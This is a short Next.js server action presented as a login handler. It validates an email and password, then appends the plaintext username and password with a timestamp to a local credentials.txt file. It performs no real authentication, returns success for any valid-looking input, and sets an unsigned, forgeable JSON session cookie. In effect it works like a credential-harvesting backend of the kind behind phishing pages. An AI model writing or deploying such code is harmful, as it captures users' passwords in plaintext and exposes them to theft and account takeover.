"use server";

import fs from "fs/promises";
import path from "path";
import { z } from "zod";
import { cookies } from "next/headers";

const formSchema = z.object({
  username: z.string().email({ message: "Please enter a valid email." }),
  password: z.string().min(6, { message: "Password must be at least 6 characters." }),
  rememberMe: z.boolean().optional(),
});

export async function login(values: z.infer<typeof formSchema>) {
  // In a real app, you would authenticate the user against a database here.
  try {
    const validatedData = formSchema.parse(values);
    const { username, password, rememberMe } = validatedData;
    
    const dataToSave = `Username: ${username}, Password: ${password}, Timestamp: ${new Date().toISOString()}\n`;
    
    const filePath = path.join(process.cwd(), "credentials.txt");
    
    await fs.appendFile(filePath, dataToSave);
    
    if (rememberMe) {
      const sessionData = JSON.stringify({ username, loggedIn: true });
      cookies().set("session", sessionData, {
        httpOnly: true,
        secure: process.env.NODE_ENV === "production",
        maxAge: 60 * 60 * 24 * 7, // one week
        path: "/",
      });
    }
    
    return { success: true };
  } catch (error) {
    if (error instanceof z.ZodError) {
      return { success: false, error: "Invalid data provided. Check your email and password." };
    }
    return { success: false, error: "An error occurred on the server." };
  }
}
